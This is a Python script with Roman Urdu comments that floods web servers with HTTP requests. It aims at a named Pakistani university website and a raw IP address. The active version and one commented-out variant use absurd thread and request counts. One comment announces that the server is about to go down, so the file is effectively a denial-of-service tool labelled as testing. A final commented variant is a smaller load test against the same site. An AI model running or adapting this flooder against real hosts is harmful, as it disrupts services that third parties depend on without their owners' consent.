# from concurrent.futures import ThreadPoolExecutor
# import urllib.request

# url = "http://121.52.154.82:80/"


# def send_request(i):
#   try:
#     with urllib.request.urlopen(url) as response:
#       print(f"Req {i}: Status {response.status}")
#   except Exception as e:
#     print(f"Req {i}: Failed ({e})")


# if __name__ == "__main__":
#   print("SERVER DOWN START HONAY WALA HAI...")

#   # Ek sath requests bhejna
#   with ThreadPoolExecutor(max_workers=5000000) as executor:
#     executor.map(send_request, range(200000000))

#   print("Test mukammal ho gaya!")

from concurrent.futures import ThreadPoolExecutor
import threading
import urllib.request

url = "https://www.kust.edu.pk/"  # Apna target URL yahan rakhein

# Stop flag jo sab threads share karenge
stop_event = threading.Event()


def send_request(i):
    # Agar pehle se koi request fail ho chuki hai, toh agay mat barho
    if stop_event.is_set():
        return False

    try:
        with urllib.request.urlopen(url, timeout=5) as response:
            print(f"Req {i}: Status {response.status}")
            return True
    except Exception as e:
        print(f"Req {i}: Failed ({e})")
        # Jaise hi error aaye, stop signal set kar dein
        stop_event.set()
        return False


if __name__ == "__main__":
    print("Testing shuru ho rahi hai...")

    # Realistic worker limit (50-200 threads aam taur par standard OS limits ke mutabiq hain)
    workers = 50000
    total_requests = 100000000000

    executor = ThreadPoolExecutor(max_workers=workers)
    futures = []

    try:
        for i in range(total_requests):
            if stop_event.is_set():
                print(f"Loop rook diya gaya request {i} par!")
                break
            f = executor.submit(send_request, i)
            futures.append(f)
    finally:
        # Pending tasks ko queue se cancel karein aur mazeed wait na karein
        executor.shutdown(wait=False, cancel_futures=True)

    print("Test mukammal ya terminate ho gaya!")

# import threading
# import urllib.request
# import time

# # Apni website ka URL yahan dalein (http:// ya https:// zaroor lagayein)
# url = "https://www.kust.edu.pk/"

# # Settings
# total_requests = 10000  # Total kitni requests bhejni hain (ab -n 1000)
# concurrent_users = 50  # Ek waqt mein kitne log aayenge (ab -c 50)

# success_count = 0
# fail_count = 0
# lock = threading.Lock()

# def fetch_url():
#     global success_count, fail_count
#     try:
#         # Timeout 5 second rakha hai taake server atak jaye toh pata chal jaye
#         req = urllib.request.Request(url, headers={'User-Agent': ''})
#         with urllib.request.urlopen(req, timeout=5) as response:
#             with lock:
#                 success_count += 1
#     except Exception as e:
#         with lock:
#             fail_count += 1

# def worker():
#     while True:
#         try:
#             # Queue system ki tarah requests kam karte jao
#             request_id = requests_queue.pop()
#             fetch_url()
#         except IndexError:
#             break # Jab requests khatam  ho jayein toh ruk jao

# if __name__ == "__main__":
#     print(f"Testing Start: {total_requests} requests, {concurrent_users} users ek sath...")
    
#     # Requests ki ek list banayi
#     requests_queue = list(range(total_requests))
#     threads = []
    
#     start_time = time.time()

#     # Threads start karein
#     for _ in range(concurrent_users):
#         t = threading.Thread(target=worker)
#         t.start()
#         threads.append(t)

#     # Sab threads ke khatam hone ka wait karein
#     for t in threads:
#         t.join()

#     end_time = time.time()
#     time_taken = end_time - start_time

#     print("-" * 30)
#     print("Test Mukammal Ho Gaya!")
#     print(f"Time Taken:     {time_taken:.2f} seconds")
#     print(f"Successful:     {success_count}")
#     print(f"Failed:         {fail_count}")
#     if time_taken > 0:
#         print(f"Req per second: {total_requests / time_taken:.2f} req/sec")